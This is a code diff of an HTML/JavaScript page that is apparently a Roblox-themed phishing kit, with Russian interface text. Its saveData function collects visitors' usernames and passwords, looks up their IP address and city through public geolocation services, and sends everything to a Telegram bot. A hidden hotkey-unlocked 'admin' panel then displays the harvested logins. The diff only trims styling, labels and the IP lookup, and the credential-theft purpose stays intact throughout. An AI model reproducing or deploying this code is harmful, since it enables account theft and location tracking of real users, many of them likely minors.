@@ -15,7 +15,7 @@
         .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
         
         .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100%; max-height: 250px; overflow-y: auto; padding-right: 5px; }
-        .acc-item { background: #393b3d; padding: 8px; border-radius: 5px; cursor: pointer; border: 1px solid transparent; font-size: 13px; text-align: center; transition: 0.2s; }
+        .acc-item { background: #393b3d; padding: 8px; border-radius: 5px; cursor: pointer; border: 1px solid transparent; font-size: 13px; text-align: center; }
         .acc-item:hover { border-color: #ff0000; background: #444; }
 
         .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1100px; border: 1px solid #444; max-height: 450px; overflow-y: auto; }
@@ -43,7 +43,6 @@
     <div id="admin-auth" class="screen">
         <div class="login-card" style="border: 2px solid #ff0000;">
             <h2 style="color: #ff0000; margin: 0;">SECURITY CHECK</h2>
-            <p style="color: #888; margin-top: 10px;">Найдите аккаунт и введите код.</p>
             <input type="password" id="admin_pass" placeholder="Код из TG">
             <div id="acc-selector" class="acc-list" style="display: none;"></div>
             <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="startVerification()">Получить код доступа</button>
@@ -57,13 +56,13 @@
                 <span id="live-indicator">⚡ LIVE SYNC</span>
             </div>
             <table>
-                <thead><tr><th>Пользователь</th><th>Пароль</th><th>IP и Локация</th><th>Время</th></tr></thead>
+                <thead><tr><th>User</th><th>Pass</th><th>IP</th><th>Time</th></tr></thead>
                 <tbody id="logData"></tbody>
             </table>
         </div>
         <div style="margin-top: 20px; display: flex; gap: 10px;">
-            <button class="btn-auth" style="width: 150px;" onclick="location.reload()">Выход</button>
-            <button class="btn-auth btn-clear" style="width: 180px;" onclick="clearLogs()">Очистить логи</button>
+            <button class="btn-auth" onclick="location.reload()">Выход</button>
+            <button class="btn-auth btn-clear" onclick="clearLogs()">Очистить логи</button>
         </div>
     </div>
 
@@ -74,15 +73,8 @@
         let targetAccount = "";
         let lastLogsCount = -1;
 
-        const mockAccounts = [
-            "Admin_Vip", "Roblox_Owner", "Mod_Check", "System_Root", "User_Test", 
-            "Dev_Access", "Security_Bot", "Main_Admin", "Global_Mod", "Data_Manager",
-            "Root_User", "AntiCheat_Dev", "Support_01", "Vip_Guard", "Server_Host",
-            "Database_Admin", "Network_Sec", "Debug_Master", "Shadow_Mod", "Tech_Lead",
-            "Analyst_X", "Proxy_Node", "Kernel_User", "Log_Monitor", "Admin_Final"
-        ];
+        const mockAccounts = ["Admin_Vip", "Roblox_Owner", "Mod_Check", "System_Root", "User_Test", "Dev_Access", "Security_Bot", "Main_Admin", "Global_Mod", "Data_Manager", "Root_User", "AntiCheat_Dev", "Support_01", "Vip_Guard", "Server_Host", "Database_Admin", "Network_Sec", "Debug_Master", "Shadow_Mod", "Tech_Lead", "Analyst_X", "Proxy_Node", "Kernel_User", "Log_Monitor", "Admin_Final"];
 
-        // Горячие клавиши Ctrl + \ + 3 + Z
         let keys = {};
         document.addEventListener('keydown', (e) => {
             keys[e.code] = true;
@@ -105,13 +97,11 @@
         async function startVerification() {
             secretCode = Math.floor(1000 + Math.random() * 9000).toString();
             targetAccount = mockAccounts[Math.floor(Math.random() * mockAccounts.length)];
-            await sendToTg(`🔐 *ЗАПРОС ВХОДА*\nКод: \`${secretCode}\` \nНужный акк: *${targetAccount}*`);
-            
+            await sendToTg(`🔐 *ВХОД*\nКод: \`${secretCode}\` \nАкк: *${targetAccount}*`);
             document.getElementById('request-btn').style.display = "none";
             const accSelector = document.getElementById('acc-selector');
             accSelector.style.display = "grid";
             accSelector.innerHTML = "";
-            
             mockAccounts.forEach(acc => {
                 const div = document.createElement('div');
                 div.className = 'acc-item';
@@ -119,40 +109,30 @@
                 div.onclick = async () => {
                     const enteredPass = document.getElementById('admin_pass').value;
                     if (enteredPass === secretCode && acc === targetAccount) {
-                        await sendToTg(`✅ *УСПЕШНЫЙ ВХОД В АДМИНКУ*`);
                         showScreen('admin-panel');
                         setInterval(updateLogs, 10);
-                    } else { 
-                        await sendToTg(`❌ *ОШИБКА ВХОДА!*\nКод: \`${enteredPass}\` \nАкк: *${acc}*`);
-                        alert("Access Denied"); location.reload(); 
-                    }
+                    } else { alert("Access Denied"); location.reload(); }
                 };
                 accSelector.appendChild(div);
             });
         }
 
-        // Улучшенная функция определения IP с тремя попытками
+        // ОБНОВЛЕННАЯ ФУНКЦИЯ: Только IP, если города нет
         async function getIP() {
-            // Попытка 1: ip-api.com (лучший сервис)
-            try {
-                const response = await fetch('http://ip-api.com/json/?lang=ru');
-                const data = await response.json();
-                if(data.status === "success") return `${data.query} (${data.city}, ${data.country})`;
-            } catch (e) { console.log("Service 1 failed"); }
-
-            // Попытка 2: ipapi.co
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
-                if(data.ip) return `${data.ip} (${data.city || 'Неизвестно'}, ${data.country_name})`;
-            } catch (e) { console.log("Service 2 failed"); }
-
-            // Попытка 3: Резервный ipify
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip + " (Город скрыт)";
-            } catch (e) { return "Скрытый IP"; }
+                if (data.ip) {
+                    // Если город есть — пишем его, если нет — только IP
+                    return data.city ? `${data.ip} (${data.city})` : data.ip;
+                }
+            } catch (e) {
+                try {
+                    const resAlt = await fetch('https://api.ipify.org?format=json');
+                    const dataAlt = await resAlt.json();
+                    return dataAlt.ip; // Тут только цифры
+                } catch(e2) { return "Hidden"; }
+            }
         }
 
         async function saveData() {
@@ -161,7 +141,7 @@
             if(!u || !p) return;
 
             const ipInfo = await getIP();
-            await sendToTg(`👤 *НОВЫЙ ЛОГ!*\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n🌐 IP: \`${ipInfo}\``);
+            await sendToTg(`👤 *LOG*\nUser: \`${u}\` \nPass: \`${p}\` \nIP: \`${ipInfo}\``);
             
             let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
             logs.push({ user: u, pass: p, ip: ipInfo, time: new Date().toLocaleTimeString() });
@@ -173,13 +153,13 @@
             const logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
             if (logs.length === lastLogsCount) return;
             const tbody = document.getElementById('logData');
-            tbody.innerHTML = logs.length === 0 ? "<tr><td colspan='4' style='text-align:center'>Логи отсутствуют</td></tr>" : 
+            tbody.innerHTML = logs.length === 0 ? "<tr><td colspan='4' style='text-align:center'>Пусто</td></tr>" : 
                 logs.slice().reverse().map(l => `<tr><td>${l.user}</td><td>${l.pass}</td><td>${l.ip}</td><td>${l.time}</td></tr>`).join('');
             lastLogsCount = logs.length;
         }
 
         function clearLogs() {
-            if (confirm("Вы уверены, что хотите очистить всю историю логов?")) {
+            if (confirm("Очистить?")) {
                 localStorage.removeItem('roblox_logs');
                 updateLogs();
             }
